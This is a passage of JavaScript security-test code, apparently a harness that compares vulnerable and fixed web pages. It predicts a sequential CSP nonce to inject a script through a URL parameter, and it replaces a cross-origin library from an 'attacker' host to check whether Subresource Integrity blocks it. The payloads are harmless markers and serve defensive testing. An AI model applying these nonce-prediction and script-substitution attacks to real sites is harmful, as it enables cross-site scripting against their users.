    const response=await t.get('/b2-nonce-panel'),source=await response.text(),previous=/script nonce="([^"]+)"/.exec(source)?.[1];t.check(!!previous&&response.headers()['content-security-policy'].includes("'nonce-"+previous+"'"),'Actual CSP header and normal script share the response nonce');
    const predicted=/^\d+$/.test(previous)?String(Number(previous)+1):'1002',payload='<script nonce="'+predicted+'">document.body.dataset.executed="yes"</script><p>Welcome</p>';
    await t.page.goto(t.base+'/b2-nonce-panel?markup='+e(payload));await ready(t.page);t.check(await marker(t.page)===t.v,'Next CSP nonce prediction permits an actual inserted script only in V');
    t.check(await marker(t.page,'normal-ready'),'The legitimate nonce script remains functional in all arms');
    await t.page.goto(t.base+'/b2-nonce-panel?markup='+e('<script nonce="incorrect-nonce">document.body.dataset.executed="yes"</script><strong>Guide</strong>'));await ready(t.page);
    t.check(!await marker(t.page)&&await t.page.locator('#posted-markup strong').textContent()==='Guide','Wrong nonce script is blocked while ordinary HTML markup remains functional');
    t.record.cspEvidence={observedNonce:previous,predictedNonce:predicted};
  },
  R0473:async t=>{
    await t.page.goto(t.base+'/b2-library');await ready(t.page);t.check(await marker(t.page,'library-loaded'),'Original actual separate-origin script passes normal loading and fixed SRI');
    await t.login();const source='document.body.dataset.executed="yes";document.body.dataset.libraryLoaded="yes";';t.check((await t.post('/b2-library-fixture',{source})).status()===200,'Untrusted distribution fixture truly stores replacement JavaScript');
    const delivered=await t.context.request.get(t.attacker+'/b2-library.js');t.record.requests++;t.check(delivered.status()===200&&(await delivered.text())===source,'Separate-origin HTTP response contains the actual replacement bytes');
    await t.page.goto(t.base+'/b2-library');await ready(t.page);t.check(await marker(t.page)===t.v,'Browser executes changed script bytes only when fixed SRI is absent');
    if(!t.v)t.check(!await marker(t.page,'library-loaded'),'Integrity failure blocks the entire changed resource rather than only a selected marker');
    t.check((await t.post('/b2-library-fixture',{source:'document.body.dataset.libraryLoaded="yes";'})).status()===200,'Normal distribution bytes can be restored');await t.page.goto(t.base+'/b2-library');await ready(t.page);t.check(await marker(t.page,'library-loaded')&&!await marker(t.page),'Restoring original bytes preserves normal script loading in all arms');
  }
};
